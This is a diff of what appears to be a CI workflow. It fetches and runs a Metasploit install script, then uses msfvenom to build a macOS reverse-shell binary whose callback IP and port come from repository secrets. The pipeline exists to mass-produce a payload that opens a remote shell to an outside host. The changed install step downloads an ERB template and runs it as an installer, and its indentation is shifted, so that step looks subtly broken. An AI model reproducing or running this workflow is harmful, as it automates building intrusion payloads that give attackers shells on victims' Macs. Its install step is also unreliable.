@@ -13,9 +13,9 @@ jobs:
           sudo apt-get install -y curl gnupg2
       - name: Install Metasploit
         run: |
-          curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall > msfinstall
-          chmod +x msfinstall
-          sudo ./msfinstall
+         curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
+         chmod 755 msfinstall && \
+         ./msfinstall
       - name: Generate Mach-O reverse shell (using secrets)
         run: |
           msfvenom -p osx/x64/shell_reverse_tcp LHOST=${{ secrets.REVSHELL_IP }} LPORT=${{ secrets.REVSHELL_PORT }} -f macho -o reverse_shell_macos
